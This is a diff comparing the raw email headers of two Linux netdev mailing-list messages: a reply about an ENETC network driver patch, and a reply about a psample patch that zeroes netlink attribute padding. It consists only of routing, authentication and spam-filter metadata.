@@ -1,235 +1,587 @@
-Return-Path: <netdev+bounces-296179-lists+netdev=lfdr.de@vger.kernel.org>
+Return-Path: <netdev+bounces-296180-lists+netdev=lfdr.de@vger.kernel.org>
 Delivered-To: lists+netdev@lfdr.de
 Received: from mail.lfdr.de
 	by mail.lfdr.de with LMTP
-	id VFAyMjbtJGqyBwIAu9opvQ
-	(envelope-from <netdev+bounces-296179-lists+netdev=lfdr.de@vger.kernel.org>)
-	for <lists+netdev@lfdr.de>; Sun, 07 Jun 2026 06:01:58 +0200
+	id IlATGH4AJWqhCgIAu9opvQ
+	(envelope-from <netdev+bounces-296180-lists+netdev=lfdr.de@vger.kernel.org>)
+	for <lists+netdev@lfdr.de>; Sun, 07 Jun 2026 07:24:14 +0200
 X-Original-To: lists+netdev@lfdr.de
-Received: from sea.lore.kernel.org (sea.lore.kernel.org [172.234.253.10])
-	by mail.lfdr.de (Postfix) with ESMTPS id 17D0B64EC4B
-	for <lists+netdev@lfdr.de>; Sun, 07 Jun 2026 06:01:58 +0200 (CEST)
+Received: from sea.lore.kernel.org (sea.lore.kernel.org [IPv6:2600:3c0a:e001:db::12fc:5321])
+	by mail.lfdr.de (Postfix) with ESMTPS id A2DF964ED90
+	for <lists+netdev@lfdr.de>; Sun, 07 Jun 2026 07:24:13 +0200 (CEST)
 Authentication-Results: mail.lfdr.de;
-	dkim=pass header.d=NXP1.onmicrosoft.com header.s=selector1-NXP1-onmicrosoft-com header.b=TnX88S2r;
-	spf=pass (mail.lfdr.de: domain of "netdev+bounces-296179-lists+netdev=lfdr.de@vger.kernel.org" designates 172.234.253.10 as permitted sender) smtp.mailfrom="netdev+bounces-296179-lists+netdev=lfdr.de@vger.kernel.org";
-	dmarc=fail reason="SPF not aligned (relaxed), DKIM not aligned (relaxed)" header.from=nxp.com (policy=none);
-	arc=reject ("cv is fail on i=2")
+	dkim=pass header.d=asu.edu header.s=google header.b=NKs3SA8u;
+	spf=pass (mail.lfdr.de: domain of "netdev+bounces-296180-lists+netdev=lfdr.de@vger.kernel.org" designates 2600:3c0a:e001:db::12fc:5321 as permitted sender) smtp.mailfrom="netdev+bounces-296180-lists+netdev=lfdr.de@vger.kernel.org";
+	dmarc=pass (policy=none) header.from=asu.edu;
+	arc=pass ("subspace.kernel.org:s=arc-20240116:i=2")
 Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
-	by sea.lore.kernel.org (Postfix) with ESMTP id 7CAD4300CE54
-	for <lists+netdev@lfdr.de>; Sun,  7 Jun 2026 04:01:56 +0000 (UTC)
+	by sea.lore.kernel.org (Postfix) with ESMTP id F17FA3014DBA
+	for <lists+netdev@lfdr.de>; Sun,  7 Jun 2026 05:24:11 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id 00DA6267B07;
-	Sun,  7 Jun 2026 04:01:56 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id 50A0826E165;
+	Sun,  7 Jun 2026 05:24:11 +0000 (UTC)
 X-Original-To: netdev@vger.kernel.org
-Received: from GVXPR05CU001.outbound.protection.outlook.com (mail-swedencentralazon11013009.outbound.protection.outlook.com [52.101.83.9])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pl1-f180.google.com (mail-pl1-f180.google.com [209.85.214.180])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 9788D4071FE
-	for <netdev@vger.kernel.org>; Sun,  7 Jun 2026 04:01:54 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 33D681A08AF
+	for <netdev@vger.kernel.org>; Sun,  7 Jun 2026 05:24:08 +0000 (UTC)
 ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1780804915; cv=fail; b=lIDJUpTzcCZBjvUOVsujljCPjtoiGb5AmmiOikQ9pO4oz/+Zwmcr69xTJsn5zpLixJ3Ir7nFOk4tNZtrOE9LceYrWm44cP7kgxEC5zinCSqANUbVNG8Fx6OmwAOWeoceqNVaAjEBdkezuE44vG/5PUj7jTJPAWFNkZx5ZQ+yLkY=
+	t=1780809851; cv=pass; b=KPChUYAcyPUzjPDfy/MwErIJS2+76xWl0B1i62Hj9LC4Z5YQKl/b6HzAWZxYtEjREOiNlB7Yo34+Z+HQFIBZR1vO6iTwW1NCZT5x6f/dFSZp4D3uv56+3WTk+7b82Otf+9/Mabdc2HkbSYoQA0hl4fq9tW5nmH5YC3nxOiJc4j0=
 ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1780804915; c=relaxed/simple;
-	bh=AnR/3NoM9KpxufVw4aKnD6Mk2mQiGnl5bAkKGQf+WzQ=;
-	h=From:To:CC:Subject:Date:Message-ID:References:In-Reply-To:
-	 Content-Type:MIME-Version; b=mjn1N4Hisej2IfbOksPPbePxCBvDCz+z+E0Vdr6A3gu7g4+61LI6CP+uMK0DuCtBMy11xbWdjW14sFFOtql2Aasctl0AEsB2+1t0tEykV2ZKeDTCKdqzwFhiar8wBJmeJ+jdfR1kxkTHOwhQWMAq85yQy3h6FncjDSIMgoSibno=
-ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=oss.nxp.com; spf=pass smtp.mailfrom=oss.nxp.com; dkim=pass (2048-bit key) header.d=NXP1.onmicrosoft.com header.i=@NXP1.onmicrosoft.com header.b=TnX88S2r; arc=fail smtp.client-ip=52.101.83.9
-ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
- b=HLkNIzXtS7mO8TlYYEck/xd7DfIC8l3pLrQUWDkY1XxxxZrrdNw2upDIzwS9yRDyAqdYYZ1PNHClgclRZ8WQ4m2hkEwyGwChOteeKg9oWrFs1lLBRn4w06HYb5g1jMiUvxKzDAMuL20Qjk4tXmMmqg7091qLmkIsCNmCmHyoyy8oqbsauBNHytNejAxchuLzt0r37BmoG20p2MdBOdGj7Q5Q5Tave/HKW3z5WYRoW3e9xPBNHF5fpbC/8vI+93+9mUn/IrEggejJ7J2OBz+8mbmEqTHq7ttAUJyN1Lu0sys3RR374S47unt8k+W5WOSti4SjTSW3LTUfY+AIA2wL4g==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
- s=arcselector10001;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
- bh=AnR/3NoM9KpxufVw4aKnD6Mk2mQiGnl5bAkKGQf+WzQ=;
- b=qA+aUs6EQ1fSOfQzP4HCpNhNU4Ahtzpe1sngxkTeaei/4UnSdlPMA1RaLI2yPAHr9D6+cqcpYBtaYzsY0zp4pkPW9sXwGwErh+9TNoqry6bAkKtYHmIzht3gs1C1QQBUGGp5P5VcDJmSGN95ZWGmWiLT8DN+EAMSWW3tkP96bWvYpHmemedryatQbE/IyYqubhJo10QqeIIUfrFOjF9zd+sd3ztnkVxtOsxMQk3L935WA6VWYH08ZU9HfK4y1zGB902S6gHSq+1GFxzwjZARC7vvkuQG/H2vHPjbmg1XZfefWGq1rjzaqN7C3kokznsQN8HRgYoHMgNIhDoMrv0lTQ==
-ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
- smtp.mailfrom=oss.nxp.com; dmarc=pass action=none header.from=oss.nxp.com;
- dkim=pass header.d=oss.nxp.com; arc=none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=NXP1.onmicrosoft.com;
- s=selector1-NXP1-onmicrosoft-com;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
- bh=AnR/3NoM9KpxufVw4aKnD6Mk2mQiGnl5bAkKGQf+WzQ=;
- b=TnX88S2rE/6BrzmPX0EgK94DisBgSKu2M46dfhiur25d1zale7STYA2zgiQJx8ctzs/KH3v82OBzUUaueq/zWom2HxRY5D9B2/eLA8fKNBPNPW+GALhkHLWjKum9CjwzKn/J1vs6GJZm6N52985N+3OkdbMaN2n2/qDUgR9KZKgA42FVHOhVC2Jk1oi0JI91QojAsWcB8ItlbfhziNzSJCCtTOZ4InWq+imW0vY3mTranhgN2fknhIfqsAxAoE6raXxmZvuM20k1fNrLigp1x9zGaekHLLVU3IKWbtYliEeZckGGEGHt6NpZ0OyzKjPG1aJp4sTUhKOdghPBslLyUA==
-Received: from DU2PR04MB8629.eurprd04.prod.outlook.com (2603:10a6:10:2dc::6)
- by AM0PR04MB6979.eurprd04.prod.outlook.com (2603:10a6:208:18b::7) with
- Microsoft SMTP Server (version=TLS1_2,
- cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.21.92.12; Sun, 7 Jun 2026
- 04:01:50 +0000
-Received: from DU2PR04MB8629.eurprd04.prod.outlook.com
- ([fe80::9d04:7526:a901:fe47]) by DU2PR04MB8629.eurprd04.prod.outlook.com
- ([fe80::9d04:7526:a901:fe47%6]) with mapi id 15.21.0092.010; Sun, 7 Jun 2026
- 04:01:50 +0000
-From: "Wei Fang (OSS)" <wei.fang@oss.nxp.com>
-To: "sashiko-reviews@lists.linux.dev" <sashiko-reviews@lists.linux.dev>
-CC: "Frank.Li@kernel.org" <Frank.Li@kernel.org>, "imx@lists.linux.dev"
-	<imx@lists.linux.dev>, Networking <netdev@vger.kernel.org>
-Subject: RE: [PATCH net-next 13/15] net: enetc: implement
- ndo_set_rx_mode_async for ENETC v4 VF
-Thread-Topic: [PATCH net-next 13/15] net: enetc: implement
- ndo_set_rx_mode_async for ENETC v4 VF
-Thread-Index: AQHc9LxR4CrneHx9e0GeRZRA7XswFrYxIZ2AgAFZo8A=
-Date: Sun, 7 Jun 2026 04:01:50 +0000
-Message-ID:
- <DU2PR04MB8629C3E161FE6CE4064C8B05881F2@DU2PR04MB8629.eurprd04.prod.outlook.com>
-References: <20260605065550.3038579-14-wei.fang@oss.nxp.com>
- <20260606072443.B83D31F00898@smtp.kernel.org>
-In-Reply-To: <20260606072443.B83D31F00898@smtp.kernel.org>
-Accept-Language: en-US
-Content-Language: en-US
-X-MS-Has-Attach:
-X-MS-TNEF-Correlator:
-x-ms-exchange-messagesentrepresentingtype: 1
-x-ms-publictraffictype: Email
-x-ms-traffictypediagnostic: DU2PR04MB8629:EE_|AM0PR04MB6979:EE_
-x-ms-office365-filtering-correlation-id: e9d1402d-4c1a-4340-2c26-08dec4498096
-x-ms-exchange-sharedmailbox-routingagent-processed: True
-x-ms-exchange-senderadcheck: 1
-x-ms-exchange-antispam-relay: 0
-x-microsoft-antispam:
- BCL:0;ARA:13230040|19092799006|1800799024|376014|366016|38070700021|22082099003|18002099003|56012099006|11063799006|4143699003;
-x-microsoft-antispam-message-info:
- zRbQAcdwHCeglt49EGyFZITfAo1UOsPZ8SKEH4+H+RFPAeft1AAQmM4mu6IDYR4RiAjTTIeJEYl3jHTgMq1sjwzZpfJ0qgqCFJoDYdSy6VT6EDIU6V+JnJh3JAuhqnCnvp+3pQHHWC+4YJRpR+dCoFY3JHQJFfy1t4L9ZJ2RI7xEp+CzggowyK9vsJvY9pMyQ7U19m1ySsPfpkMjKSWnpnIvOlhko3XvZG6S64r1eFZBeFo/RCrNA40JUHvtD2iteJOQQh0f/0ED36K2a1AcbUWstv2cbXKmr6POxROg27+tqJZbJZTN1RMRtzvYU+plU1dSIMDjIVCAROUUSMxaiERGMAoVfs9muGQNo/dqOqfrN/1NpRINFLrTMHTX2D0lHvj0e3kiv4Tiyl2gWAB7Kl77WFIm1cqqtZG24Yi08fx0Rgaxi5J20lti5SZzbyPKylECAQtl74CkamZACB3mzSdDwyg672XuCUcYycityDmIF6nbfqSqaKaoohYq820hm5ko7zMaI/fxv+KwXLwzYRmmTth7MLxI9A2VOxqD2ayhjhh3RIgj1FC08oUhpEOmn1nm0+35L2oXpOTvbiFB6fIZXBD/bDxaSfEMdtgmjq75OlhXY3PLwJXzYKgblbZNQlpVHhzyP8yOoO7dTysx80uLweyHctC13rQfnYPUhwuHiisU4vmMordOXYbOhzVveE3Y32qat18Tqcab58y9/+KLEztdIW6NSIVHkpapA8UHdrvjEai1kU4M25Rgz5K6
-x-forefront-antispam-report:
- CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:DU2PR04MB8629.eurprd04.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(19092799006)(1800799024)(376014)(366016)(38070700021)(22082099003)(18002099003)(56012099006)(11063799006)(4143699003);DIR:OUT;SFP:1101;
-x-ms-exchange-antispam-messagedata-chunkcount: 1
-x-ms-exchange-antispam-messagedata-0:
- =?utf-8?B?aVdMTDN3cFAra3BWeTdGTFFuNjdDU0FNaG1kbm1FZTlxaEZsUVNKQVY3bzl2?=
- =?utf-8?B?ZFpXMk1DT3JteVBrL3VHd3hGOW1UMnRUYmR3bE9WSTQ5SVZXcjFzWmU3ekhk?=
- =?utf-8?B?NVQrM0oyWktCTDUydkdZeU8wQ1FLMU9UNzlLcU9rajBFSUVjVUNDZCtjaTdn?=
- =?utf-8?B?YnVBOXZqNld1cVkwRURyRFBPK0czV3FBRGhkMkJYSVgraU5jZEFNR0xmWnkx?=
- =?utf-8?B?NmV5eGcrT2RZYm5raGRxdCtFZHM2OFNSOUNRR0t5QkxiWXFaLzJzNDlnVmp3?=
- =?utf-8?B?ZDlGMVVmK3BSSklIampEeTdzN0xnMWREZVBjcGlIODBSbHdsNGdJRHVUNGJ4?=
- =?utf-8?B?b1ZXc1IyT0ZuR3F1WUsxQXNZazByN0t1NlFhTXRyMklNWHNyb2lncmxPRHhi?=
- =?utf-8?B?RStLRnk1dHhBU2pCaGIxeENncGVrVVowb1RadS90QnR0TCs5Y2VBY1hOV25t?=
- =?utf-8?B?cnoxVkZlRWxnd2hGcnVLRWVsQkJoZHBoRDFGSWY1SXZ5dDJUeHRNMitUNFR0?=
- =?utf-8?B?ajlIRkhWaGJZQUVWMG9ZbnE0L2pLejN3VFJhNHBsMHdjU3Q3RFhXdEpYZWhu?=
- =?utf-8?B?S1d4VnJDaWhaNlZIV1M3TzI2MTRqVDlzMzduQnpUck1VOWxoL1JqZXJySjMr?=
- =?utf-8?B?bkRRWU9wbnlaVGprYStFVTJXOW5wK3VFeERUcVNxeHFoS2hLdGxjejgzWjJD?=
- =?utf-8?B?OHdBOWM0b24xWmozS0gxWlg5ckFKNE9YdWdnNTN1bnpzRUlRZG5VUU91YmFU?=
- =?utf-8?B?OWl4a1llR1BHNXk2M21oTGtEOUJqcjl1MGNWWVdaZmdVTFJNVVhvN1FFRnpO?=
- =?utf-8?B?OHpQNFhvdnJoN0ZGa21Hd1ZZaGt5ZDJ6VURQK2R0Y1B3TENESWZzWk1GaGR1?=
- =?utf-8?B?a2w3cEZYelpuVWVLQXVEdzQ1RzBDK1ZBZHQrSGhpRERrMEJ2VHZ6NUZPQzJL?=
- =?utf-8?B?NGxIVTk1VGVZYUVkNkJKMEM4WE4yRms0SFQxYjR6MEhmWHRMR2QzMUVuUDl2?=
- =?utf-8?B?endGcUdQcEVNTStncHlqUW5peXlpcHRGVG9JQ2JWeEdRY1Z4bGs1MllpWnM3?=
- =?utf-8?B?SThXZm9HTFZvc2pzSFppaldWbDlHVXNKcFQwUVV3L1pCbi9uRlVGL3pWTGF2?=
- =?utf-8?B?c3dtS3k0RUVkMEM2WXRDNlBkUDRldmRmVmhHWllYZGN0d09SYlBzcGR5aWNF?=
- =?utf-8?B?TnMxN1NsTHB6a3BMbG14UEtQN0szNFBGWlVDTDhrU2d4Qm1TMzFRSll5Yys2?=
- =?utf-8?B?NENGL3hWOGdZbE1iN2NkMFBEQnZ0MzJJNUNWOTRENDV5WUJpb3NXa0YzVUF5?=
- =?utf-8?B?TXE4YVU4a0k5YU1vdzZKVXhiZnVCMk9XckJVdEhYV21sV1VIZkxva3hYeVRU?=
- =?utf-8?B?bDIwZXF0dzltMVFHb2poM2gwaG1UdGV3TnJVTWtTYnRwa01aSjRGQmxCK2Ft?=
- =?utf-8?B?MytMcjlQcXZtczFOYWZSN3ptZnU4a2ZGUzVHdDBQdmNvNm9GcHZoTGlEUHFq?=
- =?utf-8?B?VjJZbkpoL1dxM3hiZ010VXpDZVBkWVllWGpTeituTEp2NjFJNi80TGF1U2JZ?=
- =?utf-8?B?dUE3ODB0WTdQbGd0alBIQlJ1L1p6amtOdTJYdlkyOVNtZkcrU0N5bnc4NVUy?=
- =?utf-8?B?dnNvcWVpN3pCTlBpT2FORjE2ZWFCVEVXTWl4QXFwNlA1UENqY2hDSTVmdCta?=
- =?utf-8?B?b3g3VFhkRlBXVG9VcGdMMC9VWkVhblZCdHFkMFZQSjduVFBwbW54UXd3L3NN?=
- =?utf-8?B?WmNnV3VLYTdTWXU3Zm1GZmh2UlJFcWRiRGFlcENUTEVuL3F5Rm5uY2ROWFJG?=
- =?utf-8?B?QytGSUJ4YTRxa1JkMk5OdTlQNWNZazY3RXByY3Q3N2wvNEF4T1B2N2NlTDY1?=
- =?utf-8?B?Z01NelZ0QTlIRklabDZNMlhFYXNQcUp0a2QzakRZbTdITlFLVHAxd0JwbDM5?=
- =?utf-8?B?UnRJN2E5UVluQ0MyTS8yOFE3bTJncmtVaURHd2hTaDYwNHJkdEg0SnRIYjVr?=
- =?utf-8?B?OHNZNjNjSWxsZUFaaExnN2F4QmxOWlJaR1ZxT0tDd2crb3VURFI2M1dyM0Jv?=
- =?utf-8?B?SHpyWnJLamFDVGhYQmo5Y2VCb3lJTVRXeUhJOGhlUit4dUsxb01nMG96SXI1?=
- =?utf-8?B?dm9TcWRBUW4rV1ZyM3VwYWF1MW9GdDVnaXRUWGZtSXAzWUYzd1RNeDlrazVO?=
- =?utf-8?B?VUlRWDdVMXpmZis3Y0hzcEVYeFFhK2lCTllBU0MzanJYR1IxUjg4cXE1OUtu?=
- =?utf-8?B?aWtNaGw0c29VeEhUV1FGZDJoeTJDVXRybEpiRW9tN3BxMUg3UloyYU9IMUNF?=
- =?utf-8?Q?NSkTleU7eYfzI6ob5Q?=
-Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: base64
+	s=arc-20240116; t=1780809851; c=relaxed/simple;
+	bh=8ZylpzfZQUr9EN+vbDfcTrJMRmunb0cS3Uv2utK6IG4=;
+	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
+	 To:Cc:Content-Type; b=gNP4Z3cgKUDYn9fSXibr4dXlvVqjTaITlFP1Ng2gmzCz+v4uD+Jh6fxK8LlKSOrGw9VI8WR43VEi8yXSaYVhVdP23hvAs0kMOv0CeshQcyuCIq2uy9YzzXcdCJ4cOx2nXRwVnwkcYtGv8VAYSq42+DKSZ41g73u2RnmQvUESLvM=
+ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=NKs3SA8u; arc=pass smtp.client-ip=209.85.214.180
+Received: by mail-pl1-f180.google.com with SMTP id d9443c01a7336-2c0c3184c71so24603775ad.1
+        for <netdev@vger.kernel.org>; Sat, 06 Jun 2026 22:24:08 -0700 (PDT)
+ARC-Seal: i=1; a=rsa-sha256; t=1780809848; cv=none;
+        d=google.com; s=arc-20240605;
+        b=PpI3cJ92ACA6H+YDr6vW1V5lELYQ84k6RdK+xkGF/cYqHzBWr99mxwe5AMjiX1dyOl
+         27yeSWD0IGNmi486d2Njsx6M4XQnNB4gt8k9Cch1JiZ+XRSx/aGrfDPekvfxaR/P7pVt
+         qwx+ATfqO9aaxdBnydfiXLOCCggYg5VxhQM2QLSb51gY97htRu5nUcju35Qcbiz7iw/G
+         V4DIDG7l+gR9NsH5wC6FsdrU4bktZk1kptiEd1vEDk/kqMhrTZp+ux7uwV47lMUiSHtP
+         bNjVWtFFUnYa48rg7OHz0an501MUM/v0oH2K//aFCQDhL3rZ4bD4HrDHEiL6BTKR2ZFj
+         cw0Q==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
+        h=content-transfer-encoding:cc:to:subject:message-id:date:from
+         :in-reply-to:references:mime-version:dkim-signature;
+        bh=YYf0p2GPAk+azSs6ebEDr1igitCoz1vXpuzvadg/+P4=;
+        fh=02FwAktCT3bAhPIrkeuyeSOT6cyBhCvN4+ZzvQ/PCis=;
+        b=gwFLzbyi+EXZEgGdUTTKbk6XtyJXeHcMF0YsY1dR3ngEsnR4vp08eN6dkteqtKmK7m
+         9WicexUDnI/TOGacUplFKI0PQYp0yqsMXRzJRxDWR7vTBMlLNfnfbYiGwj4ldriXSrSl
+         W9pgjBl3kGkSrNPy8sx+9YDd2uI0gZN5SAUrlF4qJnXgwAI2r9vp2iM4oQkl9g52gMVg
+         b4ZI4tzXueroNhR1Q1frvVEO080ncZA+ew31XLQ+z/OupsFUX215KWuSkt0vhuFR69og
+         TTNewss0ZHInd2qk3TRTTXECcllffgjPBf52IGPINzFNPe7UYv3iT/SkXUca321Z1Kpn
+         1pug==;
+        darn=vger.kernel.org
+ARC-Authentication-Results: i=1; mx.google.com; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=asu.edu; s=google; t=1780809848; x=1781414648; darn=vger.kernel.org;
+        h=content-transfer-encoding:cc:to:subject:message-id:date:from
+         :in-reply-to:references:mime-version:from:to:cc:subject:date
+         :message-id:reply-to;
+        bh=YYf0p2GPAk+azSs6ebEDr1igitCoz1vXpuzvadg/+P4=;
+        b=NKs3SA8umc1kUzHUY/UOjlzag+xeeo3Ne27NxlXHf2lrXyUcnJPALsxXfFTqQkQpbx
+         jgrxXSULbeQCXmQAN9oRPemgxa0mFT/eUnocoOiwwMBg0Tysi4KKd30uYphQDnvJqeJO
+         4dI2gjqVfsb6XwStlnh4s5HMqGrI2qK2UfWu38z7X4r8jVoWbygHO87/FIAb4ww91J/6
+         tP4jWlO8m1BKEyvRiOzuJkECXIq4GuPGTl0stbnH5qa2y1bWo7b/2t0uDAf0PSGtDM2s
+         DiSb2qfox5NAekTNxn8xuKqXjVFrvu5Hb1PaPuQM7Vte5bu4YN8p2N9a85fwWf7PAWDl
+         YVaQ==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1780809848; x=1781414648;
+        h=content-transfer-encoding:cc:to:subject:message-id:date:from
+         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
+         :to:cc:subject:date:message-id:reply-to;
+        bh=YYf0p2GPAk+azSs6ebEDr1igitCoz1vXpuzvadg/+P4=;
+        b=G12cenzZBNPRLkY5IG8nSugvGDnvTlGCCzQk6ER99QALQwJKjnSCfcPJ43pCaDhC7a
+         2jLY1zZUun6GfmQt8OFq0I3Wb0OhgEcRPIl4/hVlxExS9VypUuHFz/e8Qz+VtGDiB8XN
+         FVwKEUCtCyjChRzxUR4+kUd0jq5iQwmdPfC75ZS8dYQjitk+DKbYVr5QeO+wiLtjQmYc
+         uZjOvSnvk5TmMYj46JLUnhgc+BIseXMIPlgY6uStCHsM52Pt0vVp5reZMMACDZ24uJ1A
+         jNIYiZdkHDVzqIKboJ7TPq3woWOs8qW/l4isFJHOPI+1oD7PkQAfbtBAZbLGlnLyDGrB
+         kP7Q==
+X-Gm-Message-State: AOJu0YxctwBo4yqbCJIuC8eFW1y2wJScUr9TBNiHcNgctPtpQWf4Na78
+	vPTBzjaFXKmsUbVLJZYE/O8LN4SEWhE0UWrFmU2V+2AEFdGYtYrBdvXCfqhRX76n13blTylBG/o
+	GVBDVEvyQKvVIBwkKSngPMwiMGqZ0YdJFzN4cKYcsJBO1YPhUgAwyRYa1
+X-Gm-Gg: Acq92OHvChcppS3kcUU+Hm4cfwJQq/BCoHK/9IcdWudCisHqyEIW9PHbnAhIT9z6kuf
+	oaNFNueEo+GJ4Ki/2VpVabsPnoyIqT+9EJ7pDM6YAkzWm5RiP5XK2dBWgnaSVWU/5eb3zPfRFpX
+	1lsEGyBpiAz3SXzwUVhgsTv7+1eQ/rD8fJX7Iz76XO63olwYqFoHk4tMLLr61+skbB7Bp0SzgRy
+	vdTjvHPwwbx4qf7jPC+aWflVH3z7hXTDFO/2UXG6X5OyBFMr00T2eH2n4QH+SMVR64BlUq2Ev9C
+	BYcSxiH4XP3DWzvHQA==
+X-Received: by 2002:a05:6a21:3a94:b0:39f:82bd:298 with SMTP id
+ adf61e73a8af0-3b4cc9aec2emr13405903637.0.1780809848117; Sat, 06 Jun 2026
+ 22:24:08 -0700 (PDT)
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-X-OriginatorOrg: oss.nxp.com
-X-MS-Exchange-CrossTenant-AuthAs: Internal
-X-MS-Exchange-CrossTenant-AuthSource: DU2PR04MB8629.eurprd04.prod.outlook.com
-X-MS-Exchange-CrossTenant-Network-Message-Id: e9d1402d-4c1a-4340-2c26-08dec4498096
-X-MS-Exchange-CrossTenant-originalarrivaltime: 07 Jun 2026 04:01:50.1727
- (UTC)
-X-MS-Exchange-CrossTenant-fromentityheader: Hosted
-X-MS-Exchange-CrossTenant-id: 686ea1d3-bc2b-4c6f-a92c-d99c5c301635
-X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
-X-MS-Exchange-CrossTenant-userprincipalname: 1OGGU9yZFGijNEqVohlBNbwf9AWVC+GxA9nrFJPPH2X+wwPEbrg6Qo9GJ9/pO+bmvfBxNfPNkg2xAktakR9H7A==
-X-MS-Exchange-Transport-CrossTenantHeadersStamped: AM0PR04MB6979
+References: <20260607031640.2743713-1-xmei5@asu.edu>
+In-Reply-To: <20260607031640.2743713-1-xmei5@asu.edu>
+From: Xiang Mei <xmei5@asu.edu>
+Date: Sat, 6 Jun 2026 22:23:57 -0700
+X-Gm-Features: AVVi8Ce8IqnYLNvd85h2gqUt7ZZ7fxx9VhwLrxqjtXkEwElx7hnu2trDYvnjRQI
+Message-ID: <CAPpSM+TSXt3n5-gDM18L=N9b9bDWsGgaKVv3e88i6E9PkWzfBg@mail.gmail.com>
+Subject: Re: [PATCH net] psample: zero the netlink attribute padding in PSAMPLE_ATTR_DATA
+To: netdev@vger.kernel.org, davem@davemloft.net
+Cc: yotam.gi@gmail.com, edumazet@google.com, kuba@kernel.org, 
+	pabeni@redhat.com, horms@kernel.org, bestswngs@gmail.com
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
 X-Rspamd-Action: no action
-X-Spamd-Result: default: False [1.54 / 15.00];
-	ARC_REJECT(1.00)[cv is fail on i=2];
-	MIME_BASE64_TEXT_BOGUS(1.00)[];
-	R_DKIM_ALLOW(-0.20)[NXP1.onmicrosoft.com:s=selector1-NXP1-onmicrosoft-com];
-	R_SPF_ALLOW(-0.20)[+ip4:172.234.253.10];
+X-Spamd-Result: default: False [-0.66 / 15.00];
+	SUSPICIOUS_RECIPS(1.50)[];
+	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=2];
+	DMARC_POLICY_ALLOW(-0.50)[asu.edu,none];
+	R_DKIM_ALLOW(-0.20)[asu.edu:s=google];
+	R_SPF_ALLOW(-0.20)[+ip6:2600:3c0a:e001:db::/64];
 	MAILLIST(-0.15)[generic];
-	MIME_BASE64_TEXT(0.10)[];
 	MIME_GOOD(-0.10)[text/plain];
-	DMARC_POLICY_SOFTFAIL(0.10)[nxp.com : SPF not aligned (relaxed), DKIM not aligned (relaxed),none];
 	HAS_LIST_UNSUB(-0.01)[];
-	MIME_TRACE(0.00)[0:+];
-	RCVD_TLS_LAST(0.00)[];
-	TO_DN_SOME(0.00)[];
-	FORWARDED(0.00)[lists@lfdr.de];
-	FORGED_RECIPIENTS(0.00)[m:sashiko-reviews@lists.linux.dev,m:Frank.Li@kernel.org,m:imx@lists.linux.dev,m:netdev@vger.kernel.org,s:lists@lfdr.de];
-	FORGED_SENDER(0.00)[wei.fang@oss.nxp.com,netdev@vger.kernel.org];
-	TO_DN_EQ_ADDR_SOME(0.00)[];
-	TAGGED_FROM(0.00)[bounces-296179-lists,netdev=lfdr.de];
+	FREEMAIL_CC(0.00)[gmail.com,google.com,kernel.org,redhat.com];
+	TAGGED_FROM(0.00)[bounces-296180-lists,netdev=lfdr.de];
 	FROM_HAS_DN(0.00)[];
-	DKIM_TRACE(0.00)[NXP1.onmicrosoft.com:+];
+	RCVD_COUNT_THREE(0.00)[4];
 	FORGED_SENDER_MAILLIST(0.00)[];
+	RCVD_TLS_LAST(0.00)[];
+	FORGED_SENDER(0.00)[xmei5@asu.edu,netdev@vger.kernel.org];
+	FORGED_RECIPIENTS(0.00)[m:netdev@vger.kernel.org,m:davem@davemloft.net,m:yotam.gi@gmail.com,m:edumazet@google.com,m:kuba@kernel.org,m:pabeni@redhat.com,m:horms@kernel.org,m:bestswngs@gmail.com,m:yotamgi@gmail.com,s:lists@lfdr.de];
+	DKIM_TRACE(0.00)[asu.edu:+];
+	ASN(0.00)[asn:63949, ipnet:2600:3c0a::/32, country:SG];
+	MISSING_XM_UA(0.00)[];
